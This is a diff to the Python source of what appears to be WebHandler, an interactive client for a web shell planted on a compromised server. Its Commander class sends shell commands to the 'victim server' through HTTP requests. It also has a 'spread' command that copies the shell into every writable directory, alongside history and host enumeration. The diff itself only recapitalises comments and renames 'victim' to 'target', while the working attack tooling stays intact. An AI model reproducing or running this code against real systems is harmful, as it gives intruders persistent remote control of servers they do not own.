@@ -18,22 +18,22 @@ from core.modules.enumerate import enumerate
 
 class Commander(object):
     '''
-    Class to execute commands on the victim server
+    Class to execute commands on the target
     '''
     def BackConnect(self):
         self.cwd = info.cwd
         i = 1
-        # empty list to save attacker's pushed commands
+        # Empty list to save attacker's pushed commands
         history = []
         while True:
             try:
                 try:
-                    # getting command to be executed from the user
+                    # Getting command to be executed from the user
                     command = raw_input('{user}{red}@{end}{green}{host_ip}{end}:~{yellow}({cwd}){end}-$ '.format(user=info.current_user,
                         red=Colors.RED, green=Colors.GREEN, yellow=Colors.YELLOW, end=Colors.END,
                         host_ip=info.host_ip.split(',')[0],
                         cwd=self.cwd))
-                # if something went wrong screw the list
+                # If something went wrong screw the list
                 except IndexError:
                     command = raw_input('WebHandler@server:$ ')
 
@@ -42,35 +42,34 @@ class Commander(object):
                     if command == 'clear':
                         Popen('clear', shell=True).wait()
 
-                    # getting all commands attackr's did on the server
+                    # Getting all commands attackr's did on the server
                     elif command == 'history':
                         x = 1
                         for command in history:
                             print '{0:2d} {1}'.format(x, command)
                             x += 1
 
-                    # execute the command on the attacker's box if ! provided
-                    # at the first of the command
+                    # Execute the command on the attacker's box if '!' provided at the first of the command
                     elif command.startswith('!'):
                         Popen(command[1:], shell=True).wait()
 
-                    # get stored info from
+                    # Get stored info from
                     elif command == 'info':
                         info.get_information()
                         
-                    # update WebHandler
+                    # Update WebHandler
                     elif command == 'update':
                         info.update()
 
-                    # get WebHandler banner
+                    # Get WebHandler banner
                     elif command == 'banner':
                         print banner
 
-                    # spreat the shell to all writable directories
+                    # Spreat the shell to all writable directories
                     elif command == 'spread':
                         shell_handler.spread_shell()
 
-                    # displays the target's 'health' (CPU, Memory usage etc)
+                    # Displays the target's 'health' (CPU, Memory usage etc)
                     elif command.startswith('enum'):
                         if len(command.split()) == 2:
                             if command.split()[1] == "health":
@@ -133,8 +132,8 @@ class Commander(object):
                                 self.cwd = info.cwd  # dirty patch
 
                             else:
-                                # setting aliases for some commands to avoid
-                                # issues realted to empty directories
+                                # Setting aliases for some commands to avoid
+                                # Issues realted to empty directories
                                 command = command.replace('ls', 'ls -lha') if command.split()[0] == 'ls' else command
                                 command = command.replace('rm', 'rm -v') if command.split()[0] == 'rm' else command
                                 command = command.replace('cp', 'cp -v') if command.split()[0] == 'cp' else command
@@ -142,13 +141,13 @@ class Commander(object):
 
                                 cmd = 'cd {0};{1}'.format(self.cwd, command)
 
-                                # get the source code cotenets
+                                # Get the source code cotenets
                                 source = make_request.get_page_source(cmd)
                                 if source:
                                     for line in source:
                                         print line
 
-                                # if the executed command doesn't exist
+                                # If the executed command doesn't exist
                                 else:
                                     errmsg = '{}: command not found'.format(unquote(command))
                                     if command.split()[0] == 'echo':
@@ -158,16 +157,16 @@ class Commander(object):
                         except IndexError:
                             pass
 
-                # exist WebHandler if user provides exit as a command
+                # Exit WebHandler if user provides exit as a command
                 else:
                     print '\n[+] Preformed "{}" commands on the server\n[!] Connection closed'.format(i)
                     break
 
-            # exit WebHandler if it recieved a break (^c)
+            # Exit WebHandler if it recieved a break (^c)
             except KeyboardInterrupt:
                 print '\n\n[+] Preformed "{}" commands on the server\n[!] Connection closed'.format(i)
                 break
             i += 1
 
-# taking an instance from the main class
+# Taking an instance from the main class
 commander = Commander()
